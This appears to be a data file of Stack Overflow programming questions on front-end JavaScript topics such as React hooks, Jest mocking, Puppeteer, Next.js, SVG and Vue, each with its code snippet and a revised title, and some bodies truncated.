React Functional Components with hooks vs Class Components," With the introduction of hooks in React, the main confusion now is when to use function components with hooks and class components because with the help of hooks one can get state and partial lifecycle hooks even in function components. So, I have the following questionsWhat is the real advantages of hooks?When to use function components with hooks vs Class components?For example, function components with hooks can't help in perf as class components does. They can't skip re-renders as they don't have shouldComponentUpdate implemented. Is there anymore reasons?Thanks in advance. <code> ",React Function Components with hooks vs Class Components
When should React Memo be used?," I've been playing around with React 16.6.0 recently and I love the idea of React Memo, but I've been unable to find anything regarding scenarios best suited to implement it. The React docs (https://reactjs.org/docs/react-api.html#reactmemo) don't seem to suggest any implications from just throwing it on all of your functional components. Because it does a shallow comparison to figure out if it needs to re-render, is there ever going to be a situation that negatively impacts performance? A situation like this seems like an obvious choice for implementation: Because name will never change in this context, it makes sense to memoize. But what about a situation where props change frequently? What if I added another button that changed something else in state and triggered a re-render, would it make sense to wrap CountComponent in memo, even though this component by design is meant to update frequently?I guess my main question is as long as everything remains pure, is there ever a situation to not wrap a functional component with React Memo? <code>  // NameComponent.jsimport React from ""react"";const NameComponent = ({ name }) => <div>{name}</div>;export default React.memo(NameComponent);// CountComponent.jsimport React from ""react"";const CountComponent = ({ count }) => <div>{count}</div>;export default CountComponent;// App.jsimport React from ""react"";import NameComponent from ""./NameComponent"";import CountComponent from ""./CountComponent"";class App extends Component { state = { name: ""Keith"", count: 0 }; handleClick = e => { this.setState({ count: this.state.count + 1 }); }; render() { return ( <div> <NameComponent name={this.state.name} /> <CountComponent count={this.state.count} /> <button onClick={this.handleClick}>Add Count</button> </div> ); }}",When should you NOT use React memo?

React Hooks useEffect don't run on initial render?," According to the docs: componentDidUpdate() is invoked immediately after updating occurs.

Jest mock the same function twice to get different return values," I'm new to JEST and I'm currently testing a Javascript component that makes an API call in its onComponentDidMount. Depending on the return data of the ajax call (api call) my component either display a table or a simple text.My JEST test are fairly simple, for now I'm only testing to match the current snapshots. So since my api call can return different data, my snapshot can be of two different aspects : 1) one with a table 2) one with a simple text.I successfully mocked the service like that My component does the myService.index() call correctly, all I wish to pass to it different values which its gonna use to make the callback.Here's how the it looks like This works great for the first exemple but I cannot seem to find a correct answer that suits me.

Javascript / Typescript - get object property visibility or type," My problem:I need to differentiate between the private, public and getter (get X()) properties of a typescript class.My Project:I have an Angular project, that has a model design pattern.

The output should look like this. I made this simple function, to retrieve all properties of an object, but this gives me the private properties and the get properties both. and the toJSON function looks like this The outcome of stringify-ing the UserModel looks like this In conclusion, I need to know the visibility and type (getter or regular variable?) of properties on a class, how would I achieve this? <code>  class UserModel extends BaseModel { private _id: number; get id() { return this._id; } set id( _id: number ) { this._id = _id; }} { _id: 13} { id: 13} abstract class BaseModel { public propsToObj() : {[key: string]: any} { let ret: any = {}; for (var prop in this) { ret[prop] = this[prop]; } return ret; }} class UserModel extends BaseModel { private _id: number; get id() { return this._id; } set id( _id: number ) { this._id = _id; } toJSON() { return this.propsToObj(); }} { _id: 13, id: 13}",Javascript / Typescript - get object property visibility and type

The browser console gets cleared without any code," I wrote a silly example to see which of the two, the click or the submit event, fires first on an input of type submit.When I run it, though, nothing is written to the console.Stepping through the code in the debugger reveals the following series of occurrences.It fires the click event handler first, writes the text ""click"" to the console, but then shortly afterwards, the text disappears from the console.Also, the submit event is never fired.I infer that the form is getting submitted after executing the click event of the button. The thing I don't understand is why it isn't getting into my submit event handler?Below is the relevant code, and here is the full working example. It's just a simple HTML file you can download and try out on your machine.  <code>  (function() {let btn = document.getElementById(""btnSave"");btn.addEventListener(""click"", function(event) { console.log(""click"");}, false);btn.addEventListener(""submit"", function(event) { console.log(""submit""); // event.preventDefault();}, false);console.log(""All done now.

I then check if each new tag exists in an array (dataBase), and add it to the database if not: However, this approach will add the new tags to an array that is destroyed once I refresh the page, and new tags are not stored.How can I modify this to load server-side data (json, mongoose document or anything else that is considered a best practice), and update this data with newly added options (that pass my tests)? <code>  // Data to seed initial tags:var dataBase = [ { id: 0, text: 'Maths'}, { id: 1, text: 'English'}, { id: 2, text: 'Biology'}, { id: 3, text: 'Chemistry'}, { id: 4, text: 'Geography'}];$(document).ready(function() { $('.select2-container').select2({ ajax: { url: '../../subjects.json', dataType: 'json', }, width: 'style', multiple: true, tags: true, createTag: function (tag) { var isNew = false; tag.term = tag.term.toLowerCase(); console.log(tag.term); if(!search(tag.term, dataBase)){ if(confirm(""Are you sure you want to add this tag:"" + tag.term)){ dataBase.push({id:dataBase.length+1, text: tag.term}); isNew = true; } } return { id: tag.term, text: tag.term, isNew : isNew }; }, tokenSeparators: [',', '.'] })});// Is tag in database?function search(nameKey, myArray){ for (var i=0; i < myArray.length; i++) { if (myArray[i].text.toLowerCase() === nameKey.toLowerCase()) { return true } } return false};",Write new select2 option tags to local database in express

How to check if string is entirely made of same substring?," I have to create a function which takes a string, and it should return true or false based on whether the input consists of a repeated character sequence. The length of the given string is always greater than 1 and the character sequence must have at least one repetition. I have created the below function: Checking of this is part of the real problem. I can't afford a non-efficient solution like this. First of all, it's looping through half of the string.The second problem is that it is using replace() in each loop which makes it slow. Is there a better solution regarding performance? <code>  ""aa"" // true(entirely contains two strings ""a"")""aaa"" //true(entirely contains three string ""a"")""abcabcabc"" //true(entirely containas three strings ""abc"")""aba"" //false(At least there should be two same substrings and nothing more)""ababa"" //false(""ab"" exists twice but ""a"" is extra so false) function check(str){ if(!(str.length && str.length - 1)) return false; let temp = ''; for(let i = 0;i<=str.length/2;i++){ temp += str[i] //console.log(str.replace(new RegExp(temp,""g""),'')) if(!str.replace(new RegExp(temp,""g""),'')) return true; } return false;}console.log(check('aa')) //trueconsole.log(check('aaa')) //trueconsole.log(check('abcabcabc')) //trueconsole.log(check('aba')) //falseconsole.log(check('ababa')) //false",How do I check if a string is entirely made of the same substring?

How to make HTML table Expand on click," I am rendering HTML table with the help of JavaScript. I have made the table successfully, but now I have one requirement to show some new data in a row like on click expand rowTable functionality:I am populating my table Some brand wise each brand has some items inside them, which I want to show when the brand is clickedI almost created the table, but not able to create the expandable rowMy one of column is populating wrong data alsoIn my code I have commented all the lines what I am doing at which lineIssues I am facingI have already commented the line where I am calculating netamount to populate inside tbody as GRN entery brand wise but that's causing the issueI have created two code snippets one as full static HTML like what I want, and a second to show what I have done.The help I have found on Google I want to create something like the above snippet, but its expanding on clicking of row. I want to do it when the user clicks on plus icon, which I figured out how to do.My dynamic code with JSON data I have tried the other approach, which was when the user clicks on any brand I was making an Ajax call and running the query on the basis of that brand name and getting data, but still not able to get the expand functionality.Now I realised that this is the best approach to get the data at once, then make table with that; I am just struggling to get it rightDynamic Code Working processCurrently I have table with Brand Name,Grn Entery,Sales Sales body data which is in percentage I am calculating it by dividing grn by Total grn of that column and dividing it by 100So when user clicks on any brand names's icon that is plus in my case I want to expand rows with all itemnames of that brand and whole structure of table will be same as it is for brandname wise, grn calculation wil all be according to item name, currently it is as per brand nameEdit/updateI am having some issues:First of all using this code I am geting brand names and item names but it is taking NA also, I have tried to filter it out but haven't succeeded. Please check my snippet, I have commented all lines there.when there is transactiontype:sales and itemname and brandname= NA then I am populating those values in header as sales value they don't have any relation with calculating percentagewhen I am populating the item inside brand there I have to do it dynamically I have tried but didn't get that <code>  <script

Why '===' is slower than comparing char by char when comparing two string in javascript," I found that in Nodejs comparing two strings by comparing every char of them is faster than using the statement 'str1 === str2'.What is the reason for this?

ReactJS how to scroll to an element with hooks/functions," I wanted to ask this question again but ask now how I can achieve this using functions/hooks.I've tried to use useRef and then access the offset form current.offsetTop, however I'm struggling accessing this ref after the component was mounted. In the above example, I have a const called foo which doesn't need to have this scroll ref attached to as it shows when the content is loading.However, when running this code I get Cannot read property 'offsetTop' of undefinedIn my useEffect method, I specify the dependency as the resultsRef so I expect it to only be called when the resultsRef gets written to when the content div loads, however, this is not the case. <code>  function ScrollComponent(props) { const foo = false; //loading method let resultsRef = useRef(); useEffect(() => { window.scrollTo({ behavior: ""smooth"", top: resultsRef.current.offsetTop }); }, [resultsRef]); if (foo) return ( <div> <h4>Loading...</h4> </div> ); return ( <div ref={resultsRef}> <h4>content</h4> </div> );}",How to scroll to an element with hooks/functions?

How to using Jest/Puppeteer to wait until an element as been removed from the DOM," Summary of problem: I'm writing several test suites (using Jest and Puppeteer) to automate tests of my AngularJS app's home page. One of the tests I would like to automate is a user pressing a button on the page that deletes an element in the DOM. Unforuntealy, this element is used to display a large amount of data, so in order for the element to be deleted, the client first needs to make POST request to my server to delete the data from the db, and only then can the element be deleted from the DOM. All in all, this whole process takes about a second or two. What's more, this element I'm trying to delete was added dynamically to the DOM, so the only way I am able to access the element is by using an XPath which identifies the element by the text it contains, rather than a traditional CSS selector. Now here's my question: how can I employ Jest and Puppeteer's Api's to write some test code that WAITS for this element to no longer exist (i.e. leave the DOM). Here is a overview of what my HTML looks like so you have an idea of what I'm working with: Background: I'm using Jest (v24.8.0) as my testing framework. I'm using Puppeteer (v1.19.0) to spin up and control a headless Chromium browser.What I've tried so far:Currently, I have this code I could do something like this: ... but I want to be able to get rid of my await delay line and just have the test wait precisely until the element is gone.The problem with await delay is that it's unreliable as depending on how much data the element is displaying it may take more or less time to be deleted than what await delay specifies. Conclusion:Have any of you Jest/Puppeteer hackers come across an issue like this before and know of any clever solutions? <code>  <html> <body ng-app=""myApp"" ng-controller=""myCtrl""> <!-- Dynamically added div --> <div>My Data <table><!-- Displays tons of data --></table> </div> <form> <button type=""submit"">Delete</button> </form> </body></html> test('deleted elem no longer exists', async() => { elemXPath = '//div[contains(text(), ""My Data"")]'; // this is a function to pause the // execution of the test for a given amount of milliseconds // in order to wait for elem to be removed await delay(2000); // This fails because Puppeteer timeouts after 3000 // ms b/c elemXPath no longer exists const elemExists = await page.waitForXPath(elemXPath, {timeout: 3000}) ? true : false; expect(elemExists).toBe(false); }); test('deleted elem no longer exists', async() => { elemXPath = '//div[contains(text(), ""My Data"")]'; // wait for elem to be removed await delay(2000); try { var elemExists = await page.waitForXPath(elemXPath, {timeout: 3000}) ? true : false; } catch(err) { var elemExists = false } expect(elemExists).toBe(false); }); ",How to use Jest/Puppeteer to wait until an element as been removed from the DOM

User select none behaves differently in Safari," What I am trying to achieveI am building input-like content editable div. You are supposed to click some tags outside the div to add them inside the div while also being able to type around said tags.The problem and how to reproduce itI am using user-select: none (normal and webkit) to keep tag buttons from being selected, therefore losing my caret's position. It works in Firefox and Chrome but not in Safari (I aware of the -webkit- prefix and using it).Here is a fiddle where you can reproduce the problem.What I've triedThe root of my problem was maintaining the caret's position while leaving the content editable div.I have previously tried to use rangy but got stuck in some limitations regarding Firefox. These limitations where quite annoying from an UX standpoint. You can check my previous question and how it got me here, to this user-select: none solution -Caret disappears in Firefox when saving its position with RangyThat's how I got to this solution featuring user-select: none.My components/JS: My HTML My CSS Note: ignore the new vue, it's pasted from the Fiddle. I would suggest using the fiddle to inspect the code, reproduce the problem.Expected behaviour vs actual resultsIn Safari (latest version), if I type a word and then click somewhere in that word or move the caret in that word through the keyboard arrows then click one of the tags on the right side of the input, the tag should be added in the middle of clicked word (where was the selection made) but it is added at the beginning of the word.tl;dr: Safari does not respect the caret's position when clicking one of the tags. It adds the tag at the beginning of the content editable div, not where the caret previously was.Edit 1: Based on these logs, getSelection() teaches us that the offset is always 0 because in Safari, the div loses focus. <code>  new Vue({ el: ""#app"", data(){ return { filters_toggled: false, fake_input_content: '', input_length: 0, typed: false, boolean_buttons: [{ type: '1', label: 'I', tag: 'I', img: 'https://i.imgur.com/feHin0S.png' }, { type: '2', label: 'SAU', tag: 'SAU', img: 'https://i.imgur.com/vWJeJwb.png' }, { type: '3', label: 'NU', tag: 'NU', img: 'https://i.imgur.com/NNg1spZ.png' }], saved_sel: 0, value: null, options: ['list', 'of', 'options'] } }, name: 'boolean-input', methods: { inputLength($event){ this.input_length = $event.target.innerText.length;

How to resize div dynamically depending on parent position with exact mouse location in js," I been working on a code which was showing how to resize a div dynamically. However code was stuck on 1 element and I worked on a little to convert into multiple div resizer.Now there is a space appears between mouse and the div while being resized, my goal is to make sure every single element seperately being resized with exact mouse location depending on parent position. Any approach that would change my perspective is appriciated. Not bound to the resize nodes instead directly holding div borders also possible.Things I ve achived so far :-Made multiple divs resizable by mouse location. -Holded first location info in a function.-Calgulated difference betweeen child and parent.Things I would like to achieve:-To make sure holders stays under mouse location while resizing without any space between mouse and div. After couple attempts to resize I see there is a space appears caused by parent elements margins, paddings...etc. and div starts resizing with a space between div and the mouse location. I need a recursive solution in calgulation to correctly resize and relocate divs. May be another approach could be used to calgulate only x,y,w,h inside parent but I need some explanation about how to achive that with mouse... Also a codepen to show it more clear: https://codepen.io/BerkerYuceer/pen/gOYwqdb <code>  function resizeable() { var resizers = document.querySelectorAll('.n, .s, .w, .e, .nw, .ne, .se, .sw'); const min = 40;

In Puppeteer how to switch to chrome window with default profile," My requirement is to test chrome extensions on a new profile.I referred https://peter.sh/experiments/chromium-command-line-switches/ for Chromium args[--user-data-dir, --profile-directory]After the browser is launched, 2 chrome windows are opened. One with given profile and extension and another with default profile and given extension. Also the focus is on a window with default profile. So all actions are happening on it.I had expected that only 1 browser window would be opened with desired profile and extension.I tried to switch focus to desired window but browser.BrowserContexts().length is 1, which is browser with default profile. Also browser.targets() shows that there is only 1 target with type as browser.My Environment:1. Puppeteer version: 6.9.02. Platform / OS version: Windows 10 Pro version 18033. URLs (if applicable):4.

The code for both examples are given below.example1.js example2.js I had expected Puppeteer should launch Chrome with given:a. Profileb.

Do javascript engines optimize constant objects created within closures?," Imagine I have a function which accesses a constant (never mutated) variable (lookup table or array, for example). The constant is not referenced anywhere outside the function scope.My intuition tells me that I should define this constant outside the function scope (Option A below) to avoid (re-)creating it on every function invocation, but is this really the way modern Javascript engines work? I'd like to think that modern engines can see that the constant is never modified, and thus only has to create and cache it once (is there a term for this?). Do browsers cache functions defined within closures in the same way?Are there any non-negligible performance penalties to simply defining the constant inside the function, right next to where it's accessed (Option B)? Is the situation different for more complex objects? Testing in practiceI created a jsperf test which compares different approaches:Object - inlined (option A)Object - constant (option B)Additional variants suggested by @jmrk:Map - inlinedMap - constantswitch - inlined valuesInitial findings (on my machine, feel free to try it out for yourself):Chrome v77: (4) is by far the fastest, followed by (2)Safari v12.1: (4) is slightly faster than (2), lowest performance across browsersFirefox v69: (5) is the fastest, with (3) slightly behind <code>  // Option A:function inlinedAccess(key) { const inlinedLookupTable = { a: 1, b: 2, c: 3, d: 4, } return 'result: ' + inlinedLookupTable[key]}// Option B:const CONSTANT_TABLE = { a: 1, b: 2, c: 3, d: 4,}function constantAccess(key) { return 'result: ' + CONSTANT_TABLE[key]}",Do javascript engines optimize constants defined within closures?

Nextjs Architecture," I am looking for some Next.js Architecture advise please I am in the middle of migrating a very large express NodeJS app which has a custom SSR setup over to a Next.js setup.For the current NodeJS site I have:A bunch of routes (which hook up controllers / apis, do fancy redirections etc)Have a ton of middlewares Ton of logic in a bunch of express controllers (these controllers do things like API calls, transforming data, validation and the SSR of some React components to form the application)Most of the time the NodeJS server calls other Microservice APIs (on the same VPC) to fetch data within these controllers (eg: search api, auth api, location api etc - which are all seperate REST api servers) Note: when it fetches from these APIs its done so on an internal api address only The React Website itself calls the same NodeJS server to fetch data via client side JS when there is a route change eg: The frontend URL would be: www.mywebsite.com.auAnd any api call done from the frontend is done with route: www.mywebsite.com.au/api/*Based on all the docs i have read so far, I figure the best setup is:To keep my existing express setup for routes / middlewares (for which I have a ton of) this includes the /api/* onesMigrate controller fetching logic to the publically accessible express apis /api/* (which I kind of already have but need to clean up)For the existing express controller routes, route these to Next.js instead and use nextApp.render to specific next pagesUse getInitialProps in the Next.js pages to fetch data from those apis I mentioned in 2.Also add the old prop transform logic that was in the express controllers to getInitialPropsThis is so that the server and client share the same logic of whats in getInitialProps - and this will make the architecture clean and give me the ability to have smooth transition to use Link.The thing im struggling with it is step 4.It means now on SSR of a page request it needs to call out to the public api (www.mywebsite.com.au/api/*) on getInitialProps to fetch its data.To me seems like a performance overhead to do this as it requires a network hop to public domain mywebsite.com.au to fetch data it could have got locally on that same request (by calling localhost:3000/api/* for instance) Any advise on how to avoid the network hop outside for server render?Can I detect if its a server render and then use an internal URL (eg: use localhost:3000/api/* on the request to the same web server) or is that not best practices when using Next.js?  <code> ",Next.js Architecture

ReactJs _ SVG : How can I center my clip-path's text relatively to the viewport and display all the clip-path's text?," Here my React component demo: https://codesandbox.io/s/epic-brown-osiq1, I am now using the viewBox's values, getBBox and getBoundingClientRect() to realize some calculations in order to position my element. Currently I have entered raw value based on the return the console have provided me from the getBoundingClientRect()'s logs. You can see it on the element I have implemented the getBoundingClientRect() on, namely the <svg>'s root element and the clip-path's text's element. Better but the text is more place tower the center of the screen that really aligned on center of the text's box-you can see the ""So""'s word is at the start of the ""Food""'s word instead of being aligned on the box's center. So I am at this point currently. Thanks for the feedback.*note: You will see some comments providing information or parts of my former trials inside the sandbox.What my code does ? concretely I display a clip-path's text with some animated panel travelling the clip-path - this is the color_panel_group's element- giving some dynamic to the composition.There is also a shadow behind the text to give some depth to the composition.Expectation: display a clip-path's text responsively positioned at the vertical and horizontal's centers of the viewport. Problem: My clip-path hides a part of the text and my trials to center the element relative to viewport fails to be fructuous. What I have tried: I have tried to play with the width of the element and the x's positions of the element -mainly text, clip-path, symbol and both case. Even tried to play with the use element by implementing some class in it, but at the end of the day very approximative result outcomed. Also In tspan and symbol I have tried to play with x's attribute, again with very approximative outcomes. I have tried to play with position absolute and a relative container -mainly on the SVG's CSS selector directly-, still with approximative outcomes.I am wondering what I am missing. Maybe someone can bring some explanation on my code's behavior?Here my second presentation's resulting code (approximately what React component produces): Thanks for any hint. <code>  body { background: orange;}svg { background: green; display: block; margin: auto; position: relative; z-index: 2; top: 0; left: 0; width: 100vw; height: 100vh;}.component { min-width: 100vw; min-height: 100vh; font-size: 100%;}.fade_in_background { opacity: 1; visibility: visible; transition: all 1.5s ease-out 0s;}.brandtype { margin: auto; text-align: center;}.brandtype_use { position: absolute; transform: translate(-112.65px, 0)}.clipPath_text { text-align: center;}.color_panel_group { padding: 25px;}.shape_animation { transform-origin: 0; transform: scale(0, 1) translate(0, 0); animation: moving-panel 3s 1.5s 1 alternate forwards;}.shadow { transform: translate(10px, 10px)}.shape_animation_shadow { fill: black; fill-opacity: .505; transition: all 1.3s ease-out 0.3s;}.brandtype { font-size: 6.8em;}@keyframes moving-panel { to { transform: scale(1, 1) translate(20px, 0); }} <div class=""component""> <svg xmlns=""http://www.w3.org/2000/svg"" width=""100%"" height=""100%"" viewBox=""0 0 965 657""> <defs> <symbol id=""panel_animation"" y=""0""> <clipPath class=""clipPath_text"" id=""clipPath_text""><text class=""brandtype"" word-spacing=""-.45em""> <tspan x=""0%"" y=""50%"" dy=""1.6em"">So</tspan> <tspan x=""0%"" y=""50%"" dy=""3em"">Food</tspan> </text></clipPath> <g class=""shadow"" clip-path=""url(#clipPath_text)""> <rect class=""shape_animation shape_animation_shadow"" width=""100%"" height=""100%"" x=""-25px""> </rect> </g> <g class=""color_panel_group"" clip-path=""url(#clipPath_text)""> <rect class=""shape_animation"" fill=""#F2385A"" width=""100%"" height=""100%""></rect> <rect class=""shape_animation"" fill=""#F5A503"" width=""80%"" height=""100%""></rect> <rect class=""shape_animation"" fill=""#E9F1DF"" width=""60%"" height=""100%""></rect> <rect class=""shape_animation"" fill=""#56D9CD"" width=""40%"" height=""100%""></rect> <rect id=""shape_animation_ref"" class=""shape_animation"" fill=""#3AA1BF"" width=""20%"" height=""100%"" x=""-25px""> </rect> </g> </symbol> </defs> <rect width=""100%"" height=""100%"" filter=""url(#background_light)""></rect> <use width=""500px"" height=""100%"" x=""50%"" xlink:href=""#panel_animation"" class=""brandtype_use""></use> </svg></div>",How can I center my clip-path's text relatively to the viewport and display all the clip-path's text?

Ant Design: how to populate content section with partials for relevant menu item," I'm trying to use AntD menu sider like a tab panel.I want to put components inside the content so that the content panel renders the related component when a menu item is clicked.How do I get this structure to take components as the content for each menu item? When I try to render this, no errors are thrown, but the content div does not update with the PasswordForgetForm that I specified as the content for the menu item.I tried Chris' suggestion below - which works fine to render the component for each of the different menu item content divs in the layout segment, however - the downside of this approach is that with every page refresh, the path goes to the content component for that particular menu item, instead of the test page which has the menu on it -- and the content component with that relevant content. If this approach is endorsed as sensible, is there a way to keep the page refresh on the original page, rather than trying to go to a subset menu item url?UpdateI found this literature. I think this might be what I need to know, but the language is too technical for me to understand. Can anyone help with a plain english version of this subject matter?I also found this tutorial which uses Pose to help with rendering. While this structure is what I'm trying to achieve, it looks like Pose has been deprecated. Does anyone know if its necessary to go beyond react-router to get this outcome, or is there a solution within react that I can look to implement?This example is similar to what I want, but I can't find anything that defines sidebar (which seems to be an argument that is necessary to make this work). I have also seen this post. While some of the answers are a copy and paste of the docs, I wonder if the answer by Adam Gering is closer to what I need. I'm trying to keep the Sider menu on the /dash route at all times. That url should not change - regardless of which menu item in the sider the user clicks BUT the content div in the /dash component should be updated to render the component at the route path I've specified. APPLYING CHRIS' SUGGESTIONChris has kindly offered a suggestion below. I tried it, but the circumstance in which it does not perform as desired is when the menu item is clicked (and the relevant component correctly loads in the content div, but if I refresh the page, the refresh tries to load a page with a url that is for the component that is supposed to be inside the content div on the dashboard page. In my routes file, I have: I've also found this tutorial - which uses the same approach outlined above - and doesn't get redirected in the same way that my code does on page refresh. The tutorial uses Route instead of BrowserRouter - but otherwise I can't see any differences.NEXT ATTEMPTI saw this post (thanks Matt). I have tried to follow the suggestions in that post.I removed the outer Router wrapper from the Dashboard page (there is a Router around App.js, which is where the route to Dashboard is setup).Then, in my Dashboard, I changed the Content div to:I added: to the render method inside my Dashboard component (as shown here).I added useRouteMatch to my import statement from react-router-dom.This produces an error that says: Error: Invalid hook call. Hooks can only be called inside of the body of a function component. This could happen for one of the following reasons: 1. You might have mismatching versions of React and the renderer (such as React DOM) 2. You might be breaking the Rules of HooksThere is more message in the error above but stack overflow won't allow me to post it because it has a short linkI don't know what I've done wrong in these steps, but if I comment out the let statement, the page loads.When I go to /Dashboard and click ""account"", Im expecting the account component to render inside the content div I have in the layout on the Dashboard page. Instead, it redirects directly to a page at localhost3000/account (for which there is not page reference - it's just a component to render inside the Dashboard page). So this is worse than the problem I started with - because at least at the start, the redirect only happened on page refresh. Now it happens immediately.I found this repo that has examples of each kind of route. I can't see what it is doing that I am not. This post seems to have had the same problem as me, and resolved it using the same approach as I have tried. It's a post from 2018 so may the passage of time makes the approach outdated - but I can't see any difference between what that post solution implements and my original attempt.NEXT ATTEMPTI had thought I had found an approach that works in Lyubomir's answer on this post. I have: {${this.props.match.url}/account}> Account Settings Then in the div on the dash component where I want to display this component I have: This works. On page refresh, I can keep things working as they should.HOWEVER, when I add a second menu item with: Instead of rendering the Learning component when menu item for /learn is clicked (and the url bar changes to learn), the Account component is rendered. If i delete the account display from the switch statement, then I can have the correct Learning component displayed. With this attempt, I have the menu items working to match a Dashboard url extension (ie localhost/dash/account or localhost/dash/learn) for ONE menu item only. If I add a second menu item, the only way I can correctly render the 2nd component, is by deleting the first menu item.

Ant Design: how to populate content section with components for relevant menu item," I'm trying to use AntD menu sider like a tab panel.I want to put components inside the content so that the content panel renders the related component when a menu item is clicked.How do I get this structure to take components as the content for each menu item? When I try to render this, no errors are thrown, but the content div does not update with the PasswordForgetForm that I specified as the content for the menu item.I tried Chris' suggestion below - which works fine to render the component for each of the different menu item content divs in the layout segment, however - the downside of this approach is that with every page refresh, the path goes to the content component for that particular menu item, instead of the test page which has the menu on it -- and the content component with that relevant content. If this approach is endorsed as sensible, is there a way to keep the page refresh on the original page, rather than trying to go to a subset menu item url?UpdateI found this literature. I think this might be what I need to know, but the language is too technical for me to understand. Can anyone help with a plain english version of this subject matter?I also found this tutorial which uses Pose to help with rendering. While this structure is what I'm trying to achieve, it looks like Pose has been deprecated. Does anyone know if its necessary to go beyond react-router to get this outcome, or is there a solution within react that I can look to implement?This example is similar to what I want, but I can't find anything that defines sidebar (which seems to be an argument that is necessary to make this work). I have also seen this post. While some of the answers are a copy and paste of the docs, I wonder if the answer by Adam Gering is closer to what I need. I'm trying to keep the Sider menu on the /dash route at all times. That url should not change - regardless of which menu item in the sider the user clicks BUT the content div in the /dash component should be updated to render the component at the route path I've specified. APPLYING CHRIS' SUGGESTIONChris has kindly offered a suggestion below. I tried it, but the circumstance in which it does not perform as desired is when the menu item is clicked (and the relevant component correctly loads in the content div, but if I refresh the page, the refresh tries to load a page with a url that is for the component that is supposed to be inside the content div on the dashboard page. In my routes file, I have: I've also found this tutorial - which uses the same approach outlined above - and doesn't get redirected in the same way that my code does on page refresh. The tutorial uses Route instead of BrowserRouter - but otherwise I can't see any differences.NEXT ATTEMPTI saw this post (thanks Matt). I have tried to follow the suggestions in that post.I removed the outer Router wrapper from the Dashboard page (there is a Router around App.js, which is where the route to Dashboard is setup).Then, in my Dashboard, I changed the Content div to:I added: to the render method inside my Dashboard component (as shown here).I added useRouteMatch to my import statement from react-router-dom.This produces an error that says: Error: Invalid hook call. Hooks can only be called inside of the body of a function component. This could happen for one of the following reasons: 1. You might have mismatching versions of React and the renderer (such as React DOM) 2. You might be breaking the Rules of HooksThere is more message in the error above but stack overflow won't allow me to post it because it has a short linkI don't know what I've done wrong in these steps, but if I comment out the let statement, the page loads.When I go to /Dashboard and click ""account"", Im expecting the account component to render inside the content div I have in the layout on the Dashboard page. Instead, it redirects directly to a page at localhost3000/account (for which there is not page reference - it's just a component to render inside the Dashboard page). So this is worse than the problem I started with - because at least at the start, the redirect only happened on page refresh. Now it happens immediately.I found this repo that has examples of each kind of route. I can't see what it is doing that I am not. This post seems to have had the same problem as me, and resolved it using the same approach as I have tried. It's a post from 2018 so may the passage of time makes the approach outdated - but I can't see any difference between what that post solution implements and my original attempt.NEXT ATTEMPTI had thought I had found an approach that works in Lyubomir's answer on this post. I have: {${this.props.match.url}/account}> Account Settings Then in the div on the dash component where I want to display this component I have: This works. On page refresh, I can keep things working as they should.HOWEVER, when I add a second menu item with: Instead of rendering the Learning component when menu item for /learn is clicked (and the url bar changes to learn), the Account component is rendered. If i delete the account display from the switch statement, then I can have the correct Learning component displayed. With this attempt, I have the menu items working to match a Dashboard url extension (ie localhost/dash/account or localhost/dash/learn) for ONE menu item only. If I add a second menu item, the only way I can correctly render the 2nd component, is by deleting the first menu item.

How WebAssembly maps native Window / OpenGL / Vulkan calls to a canvas element in DOM?," I'm reading about WebAssembly and I was curious about how to port graphics programming like Vulkan or OpenGL to a canvas element.

Javascript & CSS - opening menu has glitchy transition involving z-index," I have some code that glitches initially when menus are expanded on top of each other.

Next.js Example Firebase auth - re-routing based on auth," I'm trying to use the next.js with authentication for a small project. The authentication currently works but doesn't allow me to show the data in my navbar.I was using it with firebase originally BUT NOT ANYMORE!! Now have the authentication set up separately below.This is the example repo, it has my API in it for auth and the next.js, which i'm trying to integrate together to have login and logout working with header's set for api calls. Just getting the basic login and logout functionality, so I can control user access to my website. I know this is really simple - just quite confused how to do it with next.js with how document page an app works :SI am trying to show a table of output from this API, and give the ability to download the outputed json (into a CSV or whatever). So having that available after a search with the query params, and only on a page after the user is logged in, is the point :)Here's an example of the login functionality I'm using. This is posting to this api request So just with this small example, hat's wrong with how I'm sending the requests currently?

Summing two arrays of accumulative values over time," I'm trying to figure out how to sum accumulatives values over time of two arrays, seems simple, but here's what complicates it: there might be missing dates from one of them.When one has a value for a date and the other doesn't, we sum together that value that exists from one array and the last-seen (previous) value for a date of the other array (The example I give demonstrates this better).Example, given two arrays of objects where in data2 there's a value for a date that data1 doesn't have: I want the result of summing these two together (data1 + data2) to be: Since both arrays are ordered, the approach I thought was looping the array with more data and sum it with the values of the array with less data, keeping track of what are the last date values that the smaller data gives, like this: There's a problem with this approach, what if the smaller array has a date that the bigger one doesn't?

Input event behaves differently in Angular than it does in JavaScript?," I'm learning Angular with TypeScript, and a few inconsistencies with JavaScript are troubling me. Here's a function which works perfectly with pure JavaScript (it programmatically sets min and max attributes to an input - please don't ask me why I'd want to do that programmatically): In Angular and TypeScript, the function behaves strangely: If I enter 10 into the input field, it doesn't reset to 5, until I enter another digit, meaning the value is only read after the input event (and not on-input - don't know if that makes sense). What's more strange is it works fine with the keydown and keyup events. Why this behaviour? Is it linked to the way Angular binds events to inputs? I have a feeling understanding this would help me better understand Angular's binding mechanism with NgModelFYI, here's how I called the function in Angular (using the Ionic Framework) - I used the bound quantity in [(ngModel)] as the value of the input: <code>  function change_number(input,min,max) { if(input.value > max) input.value = max; else if(input.value < min) input.value = min;} <input type='number' oninput='change_number(this,1,5)' placeholder='Enter a number' /> <ion-input type='number' (input)='change_numbers(1,5)' [(ngModel)]='quantity'></ion-input>",Why does the oninput event behave differently in Angular than it does in JavaScript?

Cypress tests not recognizing node_modules packages and/or their types," I'm having trouble with my Cypress tests for my (Typescript) application recognizing types for package I've installed.

The faker import has no problem, but the utility-types import is giving a Cannot find module 'utility-types' or its corresponding type declarations. error.I've tried explicitly including the *.d.ts files from the node_modules directory to the tsconfig.json file under compilerOptions.types, compilerOptions.typeRoots, and include properties, but to no avail.I also created ""fake"" (?) types like the following so it will compile: This allows for the app to compile AND, at run-time, the packages are resolved so it appears the issue is with finding the types, not the modules themselves.Why is Cypress not finding the types for these packages? <code>  cypressnode_modulessrc { ""compilerOptions"": { ""strict"": true, ""baseUrl"": ""../node_modules"", ""paths"": { ""~/*"": [""../src/*""] }, ""jsx"": ""react"", ""target"": ""es6"", ""lib"": [""es6"", ""dom"", ""es2017.string""], ""types"": [""cypress""] }, ""include"": [""**/*.ts""]} import * as faker from 'faker';import { DeepPartial } from 'utility-types'; declare module 'utility-types' { export type DeepPartial<T> = {};}",Cypress tests not recognizing node_modules package types

Access this.$root in Vue3 setup()," In Vue 2, you can access this.$root inside the created hook.

